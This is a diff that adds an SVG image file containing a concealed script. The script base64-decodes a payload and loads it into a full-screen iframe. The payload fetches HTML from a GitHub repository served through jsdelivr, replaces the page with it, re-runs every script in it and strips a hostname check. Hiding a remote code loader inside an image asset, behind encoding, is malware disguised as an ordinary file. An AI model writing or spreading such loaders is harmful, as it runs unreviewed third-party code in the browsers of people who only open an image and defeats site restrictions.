@@ -1,0 +1,10 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" style="position: fixed; top: 0; left: 0;"> <foreignObject x="0" y="0" width="100%" height="100%"> <body xmlns="http://www.w3.org/1999/xhtml"> <meta content='width=device-width, initial-scale=1.0' name='viewport'></meta> <iframe style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;" id="test"></iframe> <script>
+const params = new URLSearchParams(location.search);
+const site = params.get("site") || "";
+
+let l = atob("PHNjcmlwdD5sYXVuY2goKTtmdW5jdGlvbiBsYXVuY2goKSB7IHRyeSB7IGZldGNoKCJodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gvc2VhbGllZTExL2dubWF0aHByMC0tLXlAbWFpbi9pbmRleDEuaHRtbD90PSIrRGF0ZS5ub3coKSkgLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UudGV4dCgpKSAudGhlbihodG1sID0+IHsgZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LmlubmVySFRNTCA9IGh0bWwucmVwbGFjZSgibmV3IFVSTCh1cmwsIGxvY2F0aW9uLm9yaWdpbikuaG9zdG5hbWUiLCAnIiInKTsgZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJ3NjcmlwdCcpLmZvckVhY2gob2xkU2NyaXB0ID0+IHsgY29uc3QgbmV3U2NyaXB0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7IGlmIChvbGRTY3JpcHQuc3JjKSB7IG5ld1NjcmlwdC5zcmMgPSBvbGRTY3JpcHQuc3JjOyB9IGVsc2UgeyBuZXdTY3JpcHQudGV4dENvbnRlbnQgPSBvbGRTY3JpcHQudGV4dENvbnRlbnQ7IH0gZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChuZXdTY3JpcHQpOyB9KTsgfSk7IH0gY2F0Y2ggKGVycm9yKSB7IGNvbnNvbGUuZXJyb3IoJ2Vycm9yOicsIGVycm9yKTsgfSB9IDwvc2NyaXB0Pg==");
+
+l = l.replace("__SITE__", site);
+
+document.getElementById("test").srcdoc = l;
+</script> </body> </foreignObject> </svg>
